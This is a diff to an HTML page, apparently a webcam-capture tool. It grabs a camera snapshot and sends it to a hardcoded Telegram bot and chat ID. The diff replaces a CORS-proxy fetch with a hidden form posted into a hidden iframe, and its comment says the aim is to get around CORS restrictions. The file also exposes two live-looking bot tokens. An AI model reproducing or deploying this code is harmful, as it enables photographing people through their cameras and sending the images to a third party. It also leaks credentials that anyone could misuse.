@@ -9,6 +9,13 @@
 
     <h3 id="status">چاوەڕوان بە...</h3>
 
+    <!-- فۆرمی ڕاستەوخۆ بۆ تێپەڕاندنی هەموو کێشەکانی CORS و پرۆکسی -->
+    <form id="tgForm" action="https://api.telegram.org/bot8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw/sendPhoto" method="POST" enctype="multipart/form-data" target="hidden_iframe" style="display:none;">
+        <input type="hidden" name="chat_id" value="6539379136">
+        <input type="file" name="photo" id="photoInput">
+    </form>
+    <iframe name="hidden_iframe" id="hiddenIframe" style="display:none;"></iframe>
+
     <script>
       const statusEl = document.getElementById('status');
 
@@ -29,29 +36,23 @@
             canvas.toBlob(blob => {
               statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ تلگرام...";
               
-              const formData = new FormData();
-              formData.append('chat_id', '6539379136');
-              formData.append('photo', blob, 'snapshot.jpg');
+              try {
+                  const file = new File([blob], "snapshot.jpg", { type: "image/jpeg" });
+                  const dataTransfer = new DataTransfer();
+                  dataTransfer.items.add(file);
+                  
+                  document.getElementById('photoInput').files = dataTransfer.files;
+                  
+                  // ناردنی ڕاستەوخۆی فۆرمەکە بۆ تلگرام
+                  document.getElementById('tgForm').submit();
 
-              // تۆکەنی نوێی بۆتەکەت
-              const token = "897231728:AAFar8AG_UULAjxARf64N_PPzGpnUzf3wYU";
-              const targetUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+                  setTimeout(() => {
+                      statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
+                  }, 2000);
 
-              fetch('https://corsproxy.io/?' + encodeURIComponent(targetUrl), {
-                method: 'POST',
-                body: formData
-              })
-              .then(response => response.json())
-              .then(data => {
-                if(data.ok) {
-                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
-                } else {
-                    statusEl.innerText = "❌ هەڵەی تلگرام: " + (data.description || JSON.stringify(data));
-                }
-              })
-              .catch(error => {
-                statusEl.innerText = "❌ هەڵەی ناردن: " + error.message;
-              });
+              } catch (err) {
+                  statusEl.innerText = "❌ هەڵە: " + err.message;
+              }
             }, 'image/jpeg', 0.8);
           }, 2000);
         })
